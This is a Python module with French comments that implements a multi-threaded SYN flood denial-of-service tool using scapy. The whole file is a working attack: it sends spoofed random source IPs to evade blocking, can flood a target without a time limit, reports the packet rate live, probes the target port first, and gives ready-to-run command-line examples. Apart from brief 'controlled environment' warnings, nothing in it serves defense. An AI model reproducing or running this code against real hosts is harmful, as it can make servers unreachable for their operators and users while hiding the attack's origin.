"""
Module SYN Flooding - Attaque de Déni de Service (DoS)

Ce module permet de :
1. Générer des paquets TCP SYN en grand volume
2. Saturer la file de connexions d'un serveur cible
3. Supporter le multi-threading pour augmenter le débit
4. Afficher des statistiques en temps réel

ATTENTION: À utiliser uniquement dans un environnement contrôlé et éthique!
"""

import os
import sys
import time
import random
import argparse
import threading
from datetime import datetime
from pathlib import Path
from scapy.all import IP, TCP, send, sr1  # type: ignore

# Ajouter le répertoire parent au path
sys.path.append(str(Path(__file__).parent.parent))

from utils.logger import get_logger
from utils.network_utils import is_valid_ip


class SYNFlooder:
    """Classe pour gérer le SYN Flooding"""
    
    def __init__(self, target_ip, target_port, num_threads=10):
        """
        Initialise le SYN Flooder
        
        Args:
            target_ip (str): IP de la cible
            target_port (int): Port de la cible
            num_threads (int): Nombre de threads à utiliser
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_threads = num_threads
        self.logger = get_logger("SYNFlood")
        
        # Variables pour le suivi
        self.packets_sent = 0
        self.is_running = False
        self.start_time = None
        self.lock = threading.Lock()
        
        self.logger.info(f"🎯 Initialisation du SYN Flooder")
        self.logger.info(f"  Cible: {target_ip}:{target_port}")
        self.logger.info(f"  Threads: {num_threads}")
    
    def _validate_target(self):
        """
        Valide que la cible est accessible
        
        Returns:
            bool: True si valide, False sinon
        """
        if not is_valid_ip(self.target_ip):
            self.logger.error(f"❌ IP invalide: {self.target_ip}")
            return False
        
        if not (1 <= self.target_port <= 65535):
            self.logger.error(f"❌ Port invalide: {self.target_port}")
            return False
        
        self.logger.info("✅ Cible validée")
        return True
    
    def _generate_random_ip(self):
        """
        Génère une adresse IP source aléatoire
        
        Returns:
            str: Adresse IP aléatoire
        """
        return ".".join(str(random.randint(1, 254)) for _ in range(4))
    
    def _send_syn_packet(self):
        """
        Envoie un paquet TCP SYN avec IP source aléatoire
        """
        try:
            # Générer une IP source aléatoire (pour éviter le blocage)
            src_ip = self._generate_random_ip()
            src_port = random.randint(1024, 65535)
            
            # Créer un paquet IP avec TCP SYN
            ip_layer = IP(src=src_ip, dst=self.target_ip)
            tcp_layer = TCP(sport=src_port, dport=self.target_port, flags="S")
            
            # Construire et envoyer le paquet
            packet = ip_layer / tcp_layer
            send(packet, verbose=False)
            
            # Incrémenter le compteur de manière thread-safe
            with self.lock:
                self.packets_sent += 1
        
        except Exception as e:
            self.logger.error(f"❌ Erreur lors de l'envoi: {e}")
    
    def _worker_thread(self, thread_id):
        """
        Fonction exécutée par chaque thread
        
        Args:
            thread_id (int): ID du thread
        """
        self.logger.debug(f"Thread {thread_id} démarré")
        
        while self.is_running:
            self._send_syn_packet()
            # Petit délai pour éviter de saturer complètement le CPU
            # time.sleep(0.001)  # Optionnel : à décommenter si nécessaire
        
        self.logger.debug(f"Thread {thread_id} arrêté")
    
    def start_attack(self, duration=None):
        """
        Démarre l'attaque SYN Flooding
        
        Args:
            duration (int): Durée de l'attaque en secondes (None = infini)
        """
        if not self._validate_target():
            return
        
        self.is_running = True
        self.start_time = datetime.now()
        self.packets_sent = 0
        
        self.logger.attack_started("SYN_FLOOD", f"{self.target_ip}:{self.target_port}")
        print(f"\n⚡ Attaque SYN Flood lancée contre {self.target_ip}:{self.target_port}")
        print(f"   Threads actifs: {self.num_threads}")
        print("   Appuyez sur Ctrl+C pour arrêter\n")
        
        # Créer et démarrer les threads
        threads = []
        for i in range(self.num_threads):
            thread = threading.Thread(target=self._worker_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        try:
            # Afficher les statistiques en temps réel
            last_count = 0
            last_time = time.time()
            
            while self.is_running:
                time.sleep(1)
                
                # Calculer le taux de paquets par seconde
                current_time = time.time()
                current_count = self.packets_sent
                elapsed = current_time - last_time
                
                if elapsed > 0:
                    rate = (current_count - last_count) / elapsed
                    
                    # Calculer le temps écoulé total
                    total_elapsed = (datetime.now() - self.start_time).total_seconds()
                    
                    print(f"\r📤 Paquets SYN envoyés: {current_count:,} | "
                          f"Taux: {rate:.0f} pkt/s | "
                          f"Temps: {total_elapsed:.0f}s", 
                          end="", flush=True)
                
                last_count = current_count
                last_time = current_time
                
                # Vérifier la durée si spécifiée
                if duration and (datetime.now() - self.start_time).total_seconds() >= duration:
                    print("\n\n⏱️  Durée atteinte, arrêt de l'attaque...")
                    break
        
        except KeyboardInterrupt:
            print("\n\n🛑 Interruption détectée...")
        
        finally:
            self.stop_attack()
            
            # Attendre que tous les threads se terminent
            for thread in threads:
                thread.join(timeout=2)
    
    def stop_attack(self):
        """Arrête l'attaque"""
        if not self.is_running:
            return
        
        self.is_running = False
        
        print("\n⏹️  Arrêt de l'attaque...")
        
        # Statistiques
        if self.start_time:
            duration = (datetime.now() - self.start_time).total_seconds()
            avg_rate = self.packets_sent / duration if duration > 0 else 0
            
            stats = {
                "Durée": f"{duration:.2f} secondes",
                "Paquets envoyés": f"{self.packets_sent:,}",
                "Taux moyen": f"{avg_rate:.0f} paquets/s",
                "Threads utilisés": self.num_threads
            }
            
            self.logger.attack_stopped("SYN_FLOOD", stats)
            
            print("\n📊 Statistiques finales:")
            for key, value in stats.items():
                print(f"   {key}: {value}")
    
    def test_target_port(self):
        """
        Teste si le port cible est ouvert
        
        Returns:
            bool: True si ouvert, False sinon
        """
        self.logger.info(f"🔍 Test du port {self.target_port} sur {self.target_ip}...")
        
        try:
            # Envoyer un SYN et attendre la réponse
            ip_layer = IP(dst=self.target_ip)
            tcp_layer = TCP(dport=self.target_port, flags="S")
            
            response = sr1(ip_layer/tcp_layer, timeout=2, verbose=False)
            
            if response:
                if response.haslayer(TCP):
                    flags = response[TCP].flags
                    
                    # SYN-ACK = port ouvert
                    if flags == 0x12:  # SYN-ACK
                        self.logger.info(f"✅ Port {self.target_port} OUVERT")
                        
                        # Envoyer RST pour fermer proprement
                        rst = IP(dst=self.target_ip)/TCP(dport=self.target_port, flags="R")
                        send(rst, verbose=False)
                        
                        return True
                    
                    # RST = port fermé
                    elif flags == 0x14:  # RST-ACK
                        self.logger.info(f"❌ Port {self.target_port} FERMÉ")
                        return False
            
            self.logger.info(f"⚠️  Aucune réponse du port {self.target_port}")
            return False
        
        except Exception as e:
            self.logger.error(f"❌ Erreur lors du test: {e}")
            return False


def main():
    """Point d'entrée principal du module"""
    parser = argparse.ArgumentParser(
        description="💥 SYN Flooding - Attaque DoS",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemples d'utilisation:
  sudo python3 syn_flood.py -t 192.168.1.100 -p 80
  sudo python3 syn_flood.py -t 192.168.1.100 -p 80 --threads 20
  sudo python3 syn_flood.py -t 192.168.1.100 -p 80 --duration 60
  sudo python3 syn_flood.py -t 192.168.1.100 -p 80 --test

⚠️  ATTENTION: Utilisez uniquement dans un environnement contrôlé!
Cette attaque peut rendre un serveur inaccessible.
        """
    )
    
    parser.add_argument('-t', '--target', required=True,
                       help='IP de la cible')
    parser.add_argument('-p', '--port', type=int, required=True,
                       help='Port de la cible')
    parser.add_argument('--threads', type=int, default=10,
                       help='Nombre de threads (défaut: 10)')
    parser.add_argument('--duration', type=int, default=None,
                       help='Durée de l\'attaque en secondes (défaut: infini)')
    parser.add_argument('--test', action='store_true',
                       help='Tester le port avant l\'attaque')
    
    args = parser.parse_args()
    
    # Vérifier les permissions root
    if os.geteuid() != 0:
        print("❌ Ce script nécessite les privilèges root (sudo)")
        sys.exit(1)
    
    # Créer le flooder
    flooder = SYNFlooder(args.target, args.port, args.threads)
    
    # Tester le port si demandé
    if args.test:
        flooder.test_target_port()
        print("\n⏸️  Appuyez sur Entrée pour continuer l'attaque ou Ctrl+C pour quitter...")
        try:
            input()
        except KeyboardInterrupt:
            print("\n👋 Au revoir!")
            sys.exit(0)
    
    # Lancer l'attaque
    flooder.start_attack(duration=args.duration)


if __name__ == "__main__":
    main()
